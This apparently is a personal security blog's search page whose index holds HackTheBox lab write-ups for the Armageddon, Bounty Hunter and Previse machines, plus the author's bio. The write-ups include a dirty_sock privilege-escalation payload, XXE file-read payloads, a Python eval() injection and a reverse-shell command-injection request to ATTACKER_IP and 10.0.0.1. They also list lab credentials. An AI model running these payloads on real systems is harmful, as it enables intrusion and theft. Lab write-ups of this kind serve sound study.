<!DOCTYPE html>
<html lang="en">
<head>
<title>Search :: RoundofThree</title>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="description"/>
<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
<meta content="noodp" name="robots"/>
<link href="/search/" rel="canonical"/>
<link href="/assets/style.css" rel="stylesheet"/>
<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
<link href="/favicon.png" rel="shortcut icon"/>
<meta content="summary" name="twitter:card"/>
<meta content="" name="twitter:site"/>
<meta content="" name="twitter:creator"/>
<meta content="en" property="og:locale"/>
<meta content="website" property="og:type"/>
<meta content="Search" property="og:title"/>
<meta content="" property="og:description"/>
<meta content="/search/" property="og:url"/>
<meta content="RoundofThree" property="og:site_name"/>
<meta content="/favicon.png" property="og:image"/>
<meta content="2048" property="og:image:width"/>
<meta content="1024" property="og:image:height"/>
<link href="/search/index.xml" rel="alternate" title="RoundofThree" type="application/rss+xml"/>
</head>
<body class="orange">
<div class="container center headings--one-size">
<header class="header">
<div class="header__inner">
<div class="header__logo">
<a href="/">
<div class="logo">
    RoundofThree
  </div>
</a>
</div>
<div class="menu-trigger">menu</div>
</div>
<nav class="menu">
<ul class="menu__inner menu__inner--desktop">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
</nav>
</header>
<form action="/search/" id="search" method="get">
<label for="search-input" hidden="">Search site</label>
<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
<input type="submit" value="search"/>
</form>
<div class="content">
<ul id="results">
<li>
        Enter a keyword above to search this site.
    </li>
</ul>
<script>
    window.store = {
        
        
        
        
        "\/labs\/armageddon\/": {
            
            "title": "Armageddon",
            "tags": ["HackTheBox",],
            "content": "Enumeration 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).\n# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 3 12:39:22 2021 -- 1 IP address (1 host up) scanned in 27.95 seconds 2- Use metasploit and search for drupalgeddon. Exploit right away.\n3- Look at config files. In /var/www/html/sites/default/settings.php\u0026hellip;\n$databases = array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;drupaluser\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ), ), ); 4- Look at the database.\nmysql -u drupaluser -D drupal -p -e \u0026#39;select name,pass,mail from users;\u0026#39; Enter password: CQHEy@9M*m23gBVj name\tpass\tmail brucetherealadmin\t$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt\tadmin@armageddon.eu 5- Crack the hash.\njohn -w /usr/share/wordlists/rockyou.txt --format=Drupal7 admin_hash.txt brucetherealadmin:booboo Privilege escalation 6- sudo -l reveals snapd can be sudoed by brucetherealadmin. A privesc exploit for snapd is dirty_sock.\npython2 -c \u0026#39;print \u0026#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw\u0026#34; + \u0026#34;A\u0026#34;*4256 + \u0026#34;==\u0026#34;\u0026#39; | base64 -d \u0026gt; leet.snap sudo snap install --devmode leet.snap su dirty_sock # password dirty_sock, it has (ALL):ALL:ALL privileges.  sudo su  dirty_sock exploit base64 decoded: hsqs!V\\ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\u0026gt;x#!/bin/bash\nuseradd dirty_sock -m -p \u0026lsquo;$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.\u0026rsquo; -s /bin/bash usermod -aG sudo dirty_sock echo \u0026ldquo;dirty_sock ALL=(ALL:ALL) ALL\u0026rdquo; \u0026raquo; /etc/sudoers name: dirty-sock version: \u0026lsquo;0.1\u0026rsquo; summary: Empty snap, used for exploit description: \u0026lsquo;See https://github.com/initstring/dirty_sock\n' architectures:\n amd64 confinement: devmode grade: devel ï¿½ï¿½7zXZi\u0026quot;ï¿½6ï¿½dï¿½!:)È‰ï¿½ï¿½]ï¿½ï¿½Zï¿½ï¿½ï¿½ê®šï¿½Eï¿½ï¿½9\u0026gt;ï¿½Yï¿½ï¿½ï¿½`dQï¿½Rï¿½ï¿½ï¿½ï¿½dè©¯qj|ï¿½ï¿½Ù©nï¿½ï¿½^5ï¿½ï¿½I]uï¿½#ï¿½Jqï¿½Aï¿½uK9ï¿½ï¿½Uyï¿½ï¿½ï¿½ï¿½ï¿½ï¿½YZï¿½ï¿½7zXZi\u0026quot;ï¿½6ï¿½Sï¿½!ï¿½ï¿½ï¿½ï¿½ï¿½K]j;nï¿½ï¿½Qï¿½b3Ê¶]I-ï¿½,ï¿½ï¿½ï¿½ï¿½HÊ­ï¿½Eï¿½ï¿½kï¿½\t$l5Kï¿½(ï¿½yï¿½ï¿½ï¿½\t_Í¼Ó¡ï¿½hï¿½Dï¿½ï¿½u ï¿½'ï¿½yEï¿½YZ8ï¿½ï¿½\u0026lt;\\ï¿½ï¿½ï¿½\u0026gt;ï¿½ï¿½base64: invalid input  ", 
            "url": "\/labs\/armageddon\/"
        },
        
        
        
        "\/tags\/hackthebox\/": {
            
            "title": "HackTheBox",
            "tags": [],
            "content": "", 
            "url": "\/tags\/hackthebox\/"
        },
        
        
        
        "\/labs\/": {
            
            "title": "Labs",
            "tags": [],
            "content": "", 
            "url": "\/labs\/"
        },
        
        
        
        "\/tags\/": {
            
            "title": "Tags",
            "tags": [],
            "content": "", 
            "url": "\/tags\/"
        },
        
        
        
        "\/": {
            
            "title": "Whoami",
            "tags": [],
            "content": "RoundofThree (Zhuo Ying Jiang Li)  Email: zhuoyingjiangli@gmail.com Github HackTheBox. Rank: Pro Hacker. Global ranking (last updated 2021/09/05): 504 Leetcode. Ranking (last updated 2021/09/05): 3691 CV.pdf  Introduction I\u0026rsquo;m\nCoding in Golang, Python \u0026hellip;\nHacking in HackTheBox, Leetcode, Kaggle \u0026hellip;\nReading all things about infosec \u0026hellip;\nPlaying Genshin \u0026hellip;\nLoving ACG!\nSkills  In descending order of proficiency: Python, Golang, C++, Rust, Ruby, Java Web backend: Golang Gin, Ruby on Rails, Express Scripting: Python, Golang Windows Internals and forensics   Malware analysis (maldocs, js, powershell) and reverse engineering assembly Pentesting vulnerable boxes and networks at HackTheBox ML: Tensorflow, XGBoost, LightGBM, Optuna Artificial Intelligence Planning: PDDL Web frontend: VueJS 3, React Mobile app: React Native LaTex  Projects  Hacker tools and exploits  HTB machines writeups (encrypted) Automated baselining (Batchfile)   Web/Software development  MapReduce minimal implementation in Golang (MIT Distributed Systems 6.824). See official course page. Raft implementation in Golang (MIT Distributed Systems 6.824) Nyxeon (Golang Gin + VueJS 3 first project) King\u0026rsquo;s College London Chinese Alumni Association website CMS API and online payment (Ruby on Rails). Private. Online health monitoring and scheduling system (Ruby on Rails). School project. King\u0026rsquo;s College London Chinese Student Association WeChat miniprogram. Private. Bank scam honeypot web application (Ruby on Rails). School project. AirBnB market listing desktop application (JavaFX, first year coursework).   ML \u0026amp; CV \u0026amp; AI algorithms  Kaggle workflow: a template to clean, do feature engineering, model and ensemble (Python) Kaggle competitions repositories and notebooks (Python, ScikitLearn, Tensorflow, XGBoost, LightGBM) Sokoban solver using PDDL (OPTIC solver) Python scripts: watermark removal, DPLL SAT solver\u0026hellip; Google Hashcode: traffic planning (Python)    Experience  Hacker tools, techniques, exploits and incident handling training at SANS Institute GIAC GCIH certified Joined the GIAC Advisory Board King\u0026rsquo;s College London Computer Science First \u0026amp; Second Year Award King\u0026rsquo;s College London Computer Science with Management Award IB 45 points Silver medal at Iberoamerican Chemistry Olympics Silver medals at Spanish National Chemistry and Physics Olympics  ", 
            "url": "\/"
        },
        
        
        
        "\/labs\/bounty_hunter\/": {
            
            "title": "Bounty Hunter",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.\nFoothold 1- Nmap discovers ports 22 and 80.\n# Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10.10.11.100) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA | http-methods: |_ Supported Methods: GET POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 2 03:25:06 2021 -- 1 IP address (1 host up) scanned in 159.69 seconds 2- Web clues: 1- Copyright name is John \u0026ndash;\u0026gt; potential username. 2- Machine owner is a BurpSuite user. 3- HTML comments suggest we can configure the contact form email address by editing mail/contact_me.php line 19 4- 404 assets/mail/contact_me.js 5- Debugger files: resources folder \u0026ndash;\u0026gt; README.txt is a TODO list of things to fix \u0026ndash;\u0026gt; \u0026lsquo;test\u0026rsquo; account, unhashed passwords, NOPASS enabled on DB, tracker.php not connected to DB. Because the DB port is not open, this is useless. 6- Portal under development at log_submit.php.\n3- XSS failed at log_submit.php.\n4- Inspect log_submit.php: bountySubmit() -\u0026gt; see /resources/bountylog.js\nfunction returnSecret(data) { return Promise.resolve($.ajax({ type: \u0026#34;POST\u0026#34;, data: {\u0026#34;data\u0026#34;:data}, url: \u0026#34;tracker_diRbPr00f314.php\u0026#34; })); } async function bountySubmit() { try { var xml = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;${$(\u0026#39;#exploitTitle\u0026#39;).val()}\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;${$(\u0026#39;#cwe\u0026#39;).val()}\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;${$(\u0026#39;#cvss\u0026#39;).val()}\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;${$(\u0026#39;#reward\u0026#39;).val()}\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;` let data = await returnSecret(btoa(xml)); $(\u0026#34;#return\u0026#34;).html(data) } catch(error) { console.log(\u0026#39;Error:\u0026#39;, error); } } 5- XXE XML external entity injection to read db.php. Use the PHP filter to read arbitrary files:\nphp://filter/convert.base64-encode/resource=/var/www/html/db.php Use the web developer console to run these commands that mimic a bounty submission.\nvar xml = `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/var/www/html/db.php\u0026#34;\u0026gt;] \u0026gt; \u0026lt;bugreport\u0026gt;\u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt;\u0026lt;cwe\u0026gt;T\u0026lt;/cwe\u0026gt;\u0026lt;cvss\u0026gt;T\u0026lt;/cvss\u0026gt;\u0026lt;reward\u0026gt;T\u0026lt;/reward\u0026gt;\u0026lt;/bugreport\u0026gt;` let data = returnSecret(btoa(xml)) It returns:\nPromise { \u0026lt;state\u0026gt;: \u0026#34;fulfilled\u0026#34;, \u0026lt;value\u0026gt;: \u0026#34;If DB were ready, would have added:\\n\u0026lt;table\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;Title:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;CWE:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;T\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;Score:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;T\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n \u0026lt;tr\u0026gt;\\n \u0026lt;td\u0026gt;Reward:\u0026lt;/td\u0026gt;\\n \u0026lt;td\u0026gt;T\u0026lt;/td\u0026gt;\\n \u0026lt;/tr\u0026gt;\\n\u0026lt;/table\u0026gt;\\n\u0026#34; } 6- Decode base64 of /var/www/html/db.php.\n\u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; // --\u0026gt; useful for password reuse $testuser = \u0026#34;test\u0026#34;; ?\u0026gt;7- Use XXE to read /etc/passwd. See passwd file. The only users with /bin/bash are root and development. Reuse the dbpassword to ssh into them. Get user.txt.\npasswd:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin Privilege escalation 8- Read contract.txt. Clues are: \u0026lsquo;I set up the permissions for you to test this.\u0026rsquo;. Let\u0026rsquo;s see the permissions with sudo -l. I can run python tickerValidator.py with sudo.\n9- Potentials privesc ways: snap lxd privesc, sudo NOPASSWD python ticketValidator.py.\n#Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(\u0026#34;.md\u0026#34;): return open(loc, \u0026#39;r\u0026#39;) else: print(\u0026#34;Wrong file type.\u0026#34;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\u0026#34;# Skytrain Inc\u0026#34;): return False continue if i == 1: if not x.startswith(\u0026#34;## Ticket to \u0026#34;): return False print(f\u0026#34;Destination: {\u0026#39; \u0026#39;.join(x.strip().split(\u0026#39; \u0026#39;)[3:])}\u0026#34;) continue if x.startswith(\u0026#34;__Ticket Code:__\u0026#34;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\u0026#34;**\u0026#34;): return False ticketCode = x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;).split(\u0026#34;+\u0026#34;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\u0026#34;**\u0026#34;, \u0026#34;\u0026#34;)) if validationNumber \u0026gt; 100: return True else: return False return False def main(): fileName = input(\u0026#34;Please enter the path to the ticket file.\\n\u0026#34;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\u0026#34;Valid ticket.\u0026#34;) else: print(\u0026#34;Invalid ticket.\u0026#34;) ticket.close main() 10- Exploit the eval() statement to include __import__('os').system('/bin/bash'). Hand craft a ticket.md.\n# Skytrain Inc ## Ticket to __Ticket Code:__ **102+ 10 == 112 and __import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /root/root.txt\u0026#39;) == False 11- Use the hand-crafted ticket to get root shell.\npython ticketValidator.py ticket.md ", 
            "url": "\/labs\/bounty_hunter\/"
        },
        
        
        
        "\/labs\/previse\/": {
            
            "title": "Previse - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.\nPart of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Foothold 1- Nmap discovers tcp 22 and 80 ports.\n# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds 2- http://previse.htb/login.php is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt.\nTry with SQLi:\nsqlmap -r request.txt -p password # (try with username param too) No SQLi flaws discovered by sqlmap.\n3- Fuzz the request path.\nwfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc=404 http://previse.htb Interesting files:\nindex.php -- 302 Found --\u0026gt; RESPONSE1 (see step 4 for details) login.php config.php download.php -- 302 --\u0026gt; login.php header.php footer.php status.php -- 302 --\u0026gt; MySQL server is running! nav.php accounts.php -- 302 --\u0026gt; Create an admin account files.php -- 302 --\u0026gt; backup.zip YEAH!!! Site backups are very welcome! 4- Intercept request packet with BurpSuite and intercept the response. See annotations above.\nRESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).\n5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.\n\u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt;MySQL credentials:\nroot mySQL_p@ssw0rd!:) DBname: previse But we can only access the database from localhost\u0026hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it\u0026rsquo;s specific to MySQL service.\n6- Revise all files in the site backup folder. Look at logs.php. exec() promises a command injection opportunity.\n\u0026lt;?php if (!$_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: login.php\u0026#39;); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// /////////////////////////////////////////////////////////////////////////////////////  $output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; $filepath = \u0026#34;/var/www/out.log\u0026#34;; $filename = \u0026#34;out.log\u0026#34;; if(file_exists($filepath)) { header(\u0026#39;Content-Description: File Transfer\u0026#39;); header(\u0026#39;Content-Type: application/octet-stream\u0026#39;); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#34;\u0026#39;.basename($filepath).\u0026#39;\u0026#34;\u0026#39;); header(\u0026#39;Expires: 0\u0026#39;); header(\u0026#39;Cache-Control: must-revalidate\u0026#39;); header(\u0026#39;Pragma: public\u0026#39;); header(\u0026#39;Content-Length: \u0026#39; . filesize($filepath)); ob_clean(); // Discard data in the output buffer  flush(); // Flush system headers  readfile($filepath); die(); } else { http_response_code(404); die(); } ?\u0026gt;The interesting part is here:\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; We can trigger a reverse shell.\nTarget command:\npython log_process.py comma;python3 -c \u0026#39;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ATTACKER_IP\u0026#34;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Change the POST param in Burpsuite:\nPOST /logs.php HTTP/1.1 Host: previse.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 11 Origin: http://previse.htb DNT: 1 Connection: close Referer: http://previse.htb/file_logs.php Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe Upgrade-Insecure-Requests: 1 Sec-GPC: 1 delim=comma;python3+-c+'import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.0.0.1\u0026quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/bash\u0026quot;)' 7- To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:\nmysql -u root -p Enter password: mySQL_p@ssw0rd!:) \u0026gt; use previse; \u0026gt; show tables; # accounts and files \u0026gt; select * from accounts; # columns id, username, password and created_at So, the username is m4lwhere and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.\nhashcat -a 0 -m 500 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Same but with \u0026ndash;show:\nusername = m4lwhere hash = $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. password = ilovecody112235! Note that john doesn\u0026rsquo;t support non-printable characters in hash.\n8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f\nPrivilege escalation 9- sudo -l reveals the script /opt/scripts/access_backup.sh.\n10- Copy to local machine:\nscp m4lwhere@previse.htb:/opt/scripts/access_backup.sh . By looking at this file, we find command path vulnerability.\n#!/bin/bash  # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with 